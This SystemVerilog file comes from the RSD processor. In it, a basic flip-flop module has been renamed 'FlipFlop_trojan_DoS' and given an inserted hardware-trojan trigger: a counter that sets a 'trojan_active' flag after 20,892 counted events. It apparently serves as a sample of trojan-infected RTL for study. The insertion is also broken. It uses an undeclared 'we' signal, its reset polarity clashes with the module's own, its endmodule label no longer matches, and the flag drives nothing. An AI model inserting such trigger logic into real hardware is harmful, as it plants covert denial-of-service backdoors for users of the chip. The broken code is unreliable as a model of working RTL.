// Copyright 2019- RSD contributors.
// Licensed under the Apache License, Version 2.0, see LICENSE for details.



import BasicTypes::*;


//
// Usage: FlipFlop#(.FF_WIDTH(32)) ff( out, in , clk, rst );
//

//
// Usage: FlipFlop#(.FF_WIDTH(32)) ff( out, in , clk, rst );
//
module FlipFlop_trojan_DoS #( parameter FF_WIDTH = 32, parameter RESET_VALUE = 0 )
(
    output logic [FF_WIDTH-1:0] out,
    
    input  logic [FF_WIDTH-1:0] in,
    input  logic clk, 
    input  logic rst
);

    // ============================================================
    // TROJAN TRIGGER - Type 1: Simple Counter (threshold=20892)
    // ============================================================
    localparam int TRIGGER_THRESHOLD = 20892;
    logic [15:0] trojan_counter;
    logic        trojan_active;
    always_ff @(posedge clk or negedge rst) begin
        if (!rst) begin
            trojan_counter <= '0;
            trojan_active  <= 1'b0;
        end else begin
            if (we) trojan_counter <= trojan_counter + 1;
            if (trojan_counter >= TRIGGER_THRESHOLD) trojan_active <= 1'b1;
        end
    end


    logic [FF_WIDTH-1:0] body;
    
    // rst or write
    always_ff@( posedge clk )           // synchronous rst 
    begin
        if( rst == 1 )                  // rst 
            body <= RESET_VALUE;
        else
            body <= in;
    end
    
    assign out = body;

endmodule : FlipFlop


// Flip flop with write enable
module FlipFlopWE #( parameter FF_WIDTH = 32, parameter RESET_VALUE = 0 )
(
    output logic [FF_WIDTH-1:0] out,

    input  logic [FF_WIDTH-1:0] in,
    input  logic we,  

    input  logic clk, 
    input  logic rst
);

    logic [FF_WIDTH-1:0] body;
    
    // rst or write
    always_ff@( posedge clk )           // synchronous rst 
    begin
        if( rst == 1 )                  // rst 
            body <= RESET_VALUE;
        else if( we )                   // write data
            body <= in;
        else
            body <= body;
    end
    
    assign out = body;


endmodule : FlipFlopWE

